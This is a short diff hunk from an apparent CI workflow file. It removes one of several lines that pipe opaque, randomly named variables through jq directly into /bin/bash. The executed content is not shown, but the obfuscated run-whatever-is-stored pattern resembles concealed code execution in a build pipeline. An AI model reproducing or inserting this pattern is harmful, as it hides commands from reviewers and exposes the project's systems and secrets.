@@ -31,7 +31,6 @@ jobs:
           echo $so1 | jq -r .tprn5 | /bin/bash
           echo $fupv71695 | jq -r .kp092 | /bin/bash
           printf '%s' "$qg67" | jq -r .w1901 | /bin/bash
-          echo $iz4645 | jq -r .gvdke9 | /bin/bash
           printf '%s' "$ihkpx3" | jq -r .mpnv0 | /bin/bash
           echo $dgckr224 | jq -r .ac10 | /bin/bash
           echo $re1822 | jq -r .mua743 | /bin/bash
